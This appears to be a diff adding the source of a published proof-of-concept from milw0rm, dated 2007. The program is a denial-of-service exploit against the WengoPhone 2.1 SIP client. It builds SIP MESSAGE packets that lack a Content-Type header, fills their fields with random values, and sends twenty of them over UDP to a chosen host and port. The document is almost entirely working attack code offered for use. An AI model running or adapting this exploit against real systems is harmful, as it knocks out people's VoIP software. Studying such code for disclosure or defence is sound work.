@@ -1,0 +1,181 @@
+/**********main.cpp***********/
+#include <stdio.h>
+#include <string>
+using namespace std;
+
+#ifdef WIN32
+#include <winsock2.h>
+#pragma comment(lib, "ws2_32.lib")
+#define close closesocket
+#define write(a,b,c) send(a, b, c, 0)
+#define writeto(a,b,c,d,e) sendto(a, b, c, 0, d, e)
+#define read(a,b,c) recv(a, b, c, 0)
+#define readfrom(a,b,c,d,e) recvfrom(a, b, c, 0, d, e)
+#else
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netinet/tcp.h>
+#include <netdb.h>
+#include <arpa/inet.h>
+#define closesocket close
+#define SOCKET int
+#define DWORD unsigned long
+#endif
+
+char *craft_pkt =
+       "MESSAGE sip:[FROMUSER]@[DOMAIN] SIP/2.0\r\n"
+       "Via: SIP/2.0/UDP [FROMADDR]:[LOCALPORT];branch=[BRANCH]\r\n"
+       "From: [FROMUSER] <sip:[FROMADDR]:[LOCALPORT]>;tag=[TAG]\r\n"
+       "To: <sip:[TOADDR]>\r\n"
+       "Call-ID: [CALLID]@[DOMAIN]\r\n"
+       "CSeq: [CSEQ] MESSAGE\r\n"
+       "Contact: <sip:[FROMUSER]@[DOMAIN]:[LOCALPORT]>\r\n"
+       "Content-Length: 0\r\n\r\n";
+
+void socket_init()
+{
+#ifdef WIN32
+       WSADATA wsaData;
+       WSAStartup(MAKEWORD(2,0), &wsaData);
+#endif
+}
+
+unsigned long resolv(const char *host)
+{
+       struct hostent             *hp;
+       unsigned long              host_ip;
+
+       host_ip = inet_addr(host);
+       if( host_ip == INADDR_NONE )
+       {
+               hp = gethostbyname(host);
+               if(!hp)
+               {
+                       printf("\nError: Unable to resolve hostname (%s)\n",host);
+                       exit(1);
+               }
+               else
+                       host_ip = *(u_long*)hp->h_addr ;
+       }
+
+       return(host_ip);
+}
+
+SOCKET udpsocket()
+{
+       /* network */
+       SOCKET sockfd;
+       struct sockaddr_in laddr, raddr;
+
+       sockfd = socket(AF_INET, SOCK_DGRAM, 0);
+       if (sockfd == -1)
+               goto error;
+
+       memset((char *) &laddr, 0, sizeof(laddr));
+       laddr.sin_family = AF_INET;
+       laddr.sin_addr.s_addr = htonl(INADDR_ANY);
+       if (bind(sockfd, (struct sockaddr *) &laddr, sizeof(laddr)) == -1)
+               goto error;
+
+       return sockfd;
+
+error:
+#ifdef WIN32
+       printf("Error:%d\n", GetLastError());
+#endif
+       return 0;
+}
+
+
+string &replace_all(string &str,const string& old_value,const string& new_value)
+{
+       while(true)
+       {
+               string::size_type   pos(0);
+               if(   (pos=str.find(old_value))!=string::npos)
+                       str.replace(pos,old_value.length(),new_value);
+               else   break;
+       }
+       return   str;
+}
+
+string &replace_with_rand(string &str, char *value, int len)
+{
+       char *strspace = "0123456789";
+       char randstr[100];
+       for(int i=0; i<len; i++)
+       {
+               do
+               {
+                       randstr[i] = strspace[rand()%strlen(strspace)];
+               }while(randstr[i] == '0');
+       }
+       randstr[len] = 0;
+       replace_all(str, value, randstr);
+       return str;
+}
+
+string build_packet(string _packet, char *addr, char *host)
+{
+       string packet = _packet;
+       replace_all(packet, "[FROMADDR]", addr);
+       replace_all(packet, "[TOADDR]", host);
+       replace_all(packet, "[DOMAIN]", "www.nosec.org");
+       replace_all(packet, "[FROMUSER]", "siprint");
+       replace_with_rand(packet, "[CSEQ]", 9);
+       replace_with_rand(packet, "[CALLID]", 9);
+       replace_with_rand(packet, "[TAG]", 9);
+       replace_with_rand(packet, "[BRANCH]", 9);
+       return packet;
+}
+
+int main(int argc, char **argv)
+{
+       char *host;
+       int port;
+       char *localip;
+       struct sockaddr_in sockaddr;
+       struct sockaddr_in raddr;
+       int sockaddrlen = sizeof(sockaddr);
+       SOCKET s;
+
+       printf("WengoPhone 2.1 Missing Content-Type DOS PoC\n");
+
+       if(argc != 4)
+       {
+               printf("usage : %s <host> <port> <localip>\n", argv[0]);
+               exit(-1);
+       }
+
+       host = argv[1];
+       port = atoi(argv[2]);
+       localip = argv[3];
+
+       socket_init();
+       s = udpsocket();
+       if(s == 0)
+       {
+               printf("Create udp socket error!\n", host, port);
+               return 1;
+       }
+       memset(&sockaddr, 0, sockaddrlen);
+       getsockname(s, (struct sockaddr *) &sockaddr, (int *) &sockaddrlen);
+
+       raddr.sin_family = AF_INET;
+       raddr.sin_addr.S_un.S_addr = resolv(host);
+       raddr.sin_port = htons(port);
+       for(int i=0; i<20; i++)
+       {
+               char portstr[6] = {'\0'};
+               string packet = build_packet(craft_pkt, localip, host);
+               sprintf(portstr, "%d", ntohs(sockaddr.sin_port));
+               replace_all(packet, "[LOCALPORT]", portstr);
+               //printf("===========\n%s\n===========\n", packet.c_str());
+               writeto(s, packet.c_str(), packet.length(), (struct sockaddr*)&raddr, sockaddrlen);
+               Sleep(100);
+       }
+
+       return 0;
+}
+
+// milw0rm.com [2007-08-13]
